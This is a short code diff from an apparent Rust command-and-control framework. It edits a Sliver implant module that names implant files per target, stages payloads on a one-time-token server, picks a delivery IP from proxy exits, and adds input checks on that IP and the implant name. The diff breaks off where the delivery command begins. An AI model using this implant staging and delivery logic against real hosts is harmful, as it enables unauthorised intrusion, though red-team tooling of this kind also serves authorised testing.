@@ -42,7 +42,7 @@ impl<M: ExecutorMode> C2Operator for SliverScanner<M> {
     async fn prepare_payload(&self, target: &TargetHost) -> Result<String> {
         let output_path = format!("/tmp/sliver_implant_{}_{}", 
             target.host.replace('.', "_"),
-            uuid::Uuid::new_v4().to_string()[..8].to_string()
+            &uuid::Uuid::new_v4().to_string()[..8]
         );
         
         let pm = self.executor.get_proxy_manager().context("Sliver requires a ProxyManager for callback tracking")?;
@@ -73,17 +73,28 @@ impl<M: ExecutorMode> C2Operator for SliverScanner<M> {
         
         let pm = self.executor.get_proxy_manager().context("ProxyManager required for delivery")?;
         
-        // 1. Stage payload on OTT server
         let server = crate::utils::payload_server::PayloadServer::new();
-        let token = server.stage_payload(std::path::PathBuf::from(payload_path));
+        
+        // 1. Stage payload on OTT server
+        let token = server.stage_payload(std::path::PathBuf::from(payload_path)).await;
         let server_port = server.start().await?;
         
         // 2. Determine delivery IP (The operator's routable IP for the target)
         // For simplicity in V14.1, we use the first managed exit or 127.0.0.1 if local testing
         let delivery_ip = pm.get_managed_exits().first().cloned().unwrap_or_else(|| "127.0.0.1".to_string());
         
+        // 2.1 IP Validation (Sprint 1 Fixup)
+        if delivery_ip.parse::<std::net::IpAddr>().is_err() {
+            anyhow::bail!("CRITICAL: Malicious delivery IP detected: {}", delivery_ip);
+        }
+        
         let implant_name = std::path::Path::new(payload_path)
             .file_name().and_then(|n| n.to_str()).unwrap_or("implant");
+
+        // 3.1 Security Sanitization (Sprint 1)
+        if implant_name.starts_with('.') || !implant_name.chars().all(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == '.') {
+            anyhow::bail!("CRITICAL: Malicious implant name detected: {}", implant_name);
+        }
 
         // 3. Construct the delivery vector (Professional Mode)
         let delivery_cmd = format!(
